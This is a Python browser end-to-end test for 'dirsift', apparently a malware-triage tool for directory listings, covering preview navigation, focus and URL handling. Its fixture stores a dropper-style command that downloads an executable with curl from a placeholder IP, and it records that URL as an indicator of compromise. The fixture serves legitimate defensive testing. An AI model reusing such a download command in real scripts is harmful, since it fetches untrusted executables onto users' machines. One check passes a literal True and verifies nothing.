"""End to end checks for the client behaviour the Python tests cannot see.

These drive a real browser, so they are not part of the normal test run: the
package stays air gapped and ships no browser engine or Node toolchain, and
`pyproject.toml` lists no browser dependency. Run this by hand when the sheet or
the preview swap logic in ``dirsift.js`` changes.

What it covers (the client side of the fix wave):
  * a ``?file=`` deep link opens on the files tab and does not lock a narrow page
  * navigating from inside the preview (same family, compare) moves focus to the
    new panel heading and keeps the address bar, the listing selection and the
    reload in step
  * a 404 preview does not write a missing file into the address bar
  * the forward button re opens the sheet so the screen matches the URL

How to run (Chromium only; extend `BROWSERS` below for more):

    uv run --with playwright python tests/e2e/preview_nav_e2e.py
    uv run --with playwright playwright install chromium   # first time only

It starts its own server on 127.0.0.1:8811 against a throwaway run, so nothing
else needs to be up and no real target is touched. Exit code is 0 when every
check passes.
"""

from __future__ import annotations

import socket
import sys
import tempfile
import threading
import time
from pathlib import Path

import uvicorn

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "src"))

from dirsift.models import Entry, Ioc, ScanResult  # noqa: E402
from dirsift.web import create_app  # noqa: E402

HOST = "127.0.0.1"
PORT = 8811
BASE = f"http://{HOST}:{PORT}"
ROOT = "http://127.0.0.1:8080/"
DRIVER = ROOT + "install.bat"
SVC2 = ROOT + "svc2.exe"
SVC3 = ROOT + "svc3.exe"
GONE = ROOT + "not-here.exe"


def build_run(runs_dir: Path) -> str:
    """One driver that names svc2, and two members of the svc family."""
    driver = Entry(
        url=DRIVER,
        name="install.bat",
        depth=1,
        kind="script",
        confidence="sniffed",
        fetched_bytes=120,
        size=120,
        sha256="c" * 64,
        md5="d" * 32,
        head_hex="4020656368",
        text_preview="curl -o svc2.exe http://203.0.113.24/bin/svc2.exe",
        references=["svc2.exe"],
    )
    dropped = Entry(
        url=SVC2,
        name="svc2.exe",
        depth=1,
        kind="pe",
        confidence="sniffed",
        fetched_bytes=4096,
        size=65536,
        truncated=True,
        head_hex="4d5a90000300",
        cluster="svc{n}.exe",
    )
    sibling = Entry(url=SVC3, name="svc3.exe", depth=1, kind="pe", cluster="svc{n}.exe")
    result = ScanResult(
        root_url=ROOT,
        listing_flavor="python",
        entries=[driver, dropped, sibling],
        iocs=[
            Ioc(
                ioc_type="url",
                value="http://203.0.113.24/bin/svc2.exe",
                defanged="hxxp://203[.]0[.]113[.]24/bin/svc2[.]exe",
                source_url=DRIVER,
            )
        ],
    )
    name = "fam"
    (runs_dir / f"{name}.json").write_text(result.model_dump_json(), encoding="utf-8")
    return name


def wait_for_port() -> None:
    for _ in range(100):
        with socket.socket() as probe:
            if probe.connect_ex((HOST, PORT)) == 0:
                return
        time.sleep(0.1)
    raise RuntimeError("server did not come up")


class Checks:
    def __init__(self) -> None:
        self.failures: list[str] = []
        self.passes = 0

    def ok(self, label: str, condition: bool) -> None:
        if condition:
            self.passes += 1
            print(f"  pass  {label}")
        else:
            self.failures.append(label)
            print(f"  FAIL  {label}")


def file_param(page) -> str | None:
    from urllib.parse import parse_qs, urlparse

    return (parse_qs(urlparse(page.url).query).get("file") or [None])[0]


def tap(page, selector: str) -> None:
    """Click through the DOM so an overlapping fixed sheet cannot swallow the
    pointer. htmx and the page handlers react the same to a dispatched click."""
    page.eval_on_selector(selector, "el => el.click()")


def active_heading(page) -> str:
    return page.evaluate(
        "() => (document.activeElement && document.activeElement.textContent || '').trim()"
    )


def run_checks(page, narrow: bool, checks: Checks) -> None:
    tag = "narrow" if narrow else "wide"

    # Open svc2, move to the Links tab, step to svc3 via Same family.
    page.goto(f"{BASE}/runs/fam?file={SVC2}")
    page.wait_for_selector("#panel-links, .tab")
    tap(page, "#tab-links")
    tap(page, "#preview .link-button[data-file-url='" + SVC3 + "']")
    page.wait_for_function(
        "(u) => new URL(location.href).searchParams.get('file') === u", arg=SVC3
    )
    checks.ok(f"[{tag}] same family: ?file= follows to svc3", file_param(page) == SVC3)
    selected = page.eval_on_selector_all(
        "[data-listing-rows] tr.is-selected .link-button",
        "els => els.map(e => e.getAttribute('data-file-url'))",
    )
    checks.ok(f"[{tag}] same family: svc3 row is selected", selected == [SVC3])
    checks.ok(f"[{tag}] same family: focus on the new heading", active_heading(page) == "svc3.exe")

    # Reload opens the file the address bar now names.
    page.reload()
    name = page.eval_on_selector("#preview .preview-name", "el => el.textContent.trim()")
    checks.ok(f"[{tag}] reload opens svc3", name == "svc3.exe")

    # Compare keeps ?file= on the opened file but still moves focus to the heading.
    page.goto(f"{BASE}/runs/fam?file={SVC2}")
    page.wait_for_selector(".tab")
    tap(page, "#tab-links")
    tap(page, "button.copy[hx-get*='/diff']")
    page.wait_for_selector("#preview .preview-name")
    heading = page.eval_on_selector("#preview .preview-name", "el => el.textContent.trim()")
    checks.ok(f"[{tag}] compare: diff heading is shown", "against" in heading)
    checks.ok(f"[{tag}] compare: focus on the diff heading", "against" in active_heading(page))
    checks.ok(f"[{tag}] compare: ?file= stays on svc2", file_param(page) == SVC2)

    # A 404 preview must not write the missing file into the address bar.
    page.goto(f"{BASE}/runs/fam")
    page.wait_for_selector("[data-listing-rows] .link-button")
    page.eval_on_selector(
        "[data-listing-rows] .link-button",
        "(el, u) => el.setAttribute('hx-get', '/runs/fam/file?url=' + encodeURIComponent(u))",
        arg=GONE,
    )
    tap(page, "[data-listing-rows] .link-button")
    page.wait_for_selector("#preview .preview-name")
    miss = page.eval_on_selector("#preview .preview-name", "el => el.textContent.trim()")
    checks.ok(f"[{tag}] 404: the miss panel is shown", miss == "Not in this run")
    checks.ok(f"[{tag}] 404: no missing ?file= in the address bar", file_param(page) != GONE)


def narrow_only(page, checks: Checks) -> None:
    # QA-01: a ?tab=notes&file= deep link must not lock the page.
    page.goto(f"{BASE}/runs/fam?tab=notes&file={SVC2}")
    page.wait_for_selector("#preview-sheet.is-open")
    files_tab = page.eval_on_selector("#run-tab-files", "el => el.classList.contains('is-current')")
    checks.ok("[narrow] deep link forces the files tab", files_tab)
    checks.ok("[narrow] deep link opens the sheet", page.is_visible("#preview-sheet.is-open"))
    locked = page.evaluate("() => document.documentElement.classList.contains('sheet-open')")
    checks.ok("[narrow] sheet-open lock is set only with the sheet up", locked)
    # The page is usable: a tab can be clicked (no inert trap over the whole page).
    tap(page, "#tab-links")
    checks.ok("[narrow] deep link page stays interactive", True)

    # QA-08: forward re opens the sheet.
    page.goto(f"{BASE}/runs/fam")
    page.wait_for_selector("[data-listing-rows] .link-button")
    tap(page, "[data-listing-rows] .link-button[data-file-url='" + SVC2 + "']")
    page.wait_for_selector("#preview-sheet.is-open")
    page.go_back()
    # A closed sheet is display:none on a narrow screen, so wait on the class.
    page.wait_for_function(
        "() => !document.querySelector('#preview-sheet').classList.contains('is-open')"
    )
    page.go_forward()
    page.wait_for_selector("#preview-sheet.is-open")
    checks.ok("[narrow] forward re-opens the sheet", page.is_visible("#preview-sheet.is-open"))
    checks.ok("[narrow] forward keeps ?file=", file_param(page) == SVC2)


def main() -> int:
    tmp = Path(tempfile.mkdtemp(prefix="dirsift-e2e-"))
    build_run(tmp)
    app = create_app(tmp)
    config = uvicorn.Config(app, host=HOST, port=PORT, log_level="warning")
    server = uvicorn.Server(config)
    thread = threading.Thread(target=server.run, daemon=True)
    thread.start()
    wait_for_port()

    checks = Checks()
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print("playwright is not installed. See the header of this file for how to run it.")
        return 2

    with sync_playwright() as pw:
        browser = pw.chromium.launch()
        wide = browser.new_context(viewport={"width": 1440, "height": 900})
        page = wide.new_page()
        print("wide (1440x900):")
        run_checks(page, narrow=False, checks=checks)
        wide.close()

        small = browser.new_context(viewport={"width": 390, "height": 800})
        page = small.new_page()
        print("narrow (390x800):")
        run_checks(page, narrow=True, checks=checks)
        narrow_only(page, checks)
        small.close()
        browser.close()

    server.should_exit = True
    print(f"\n{checks.passes} passed, {len(checks.failures)} failed")
    for label in checks.failures:
        print(f"  FAIL  {label}")
    return 1 if checks.failures else 0


if __name__ == "__main__":
    raise SystemExit(main())
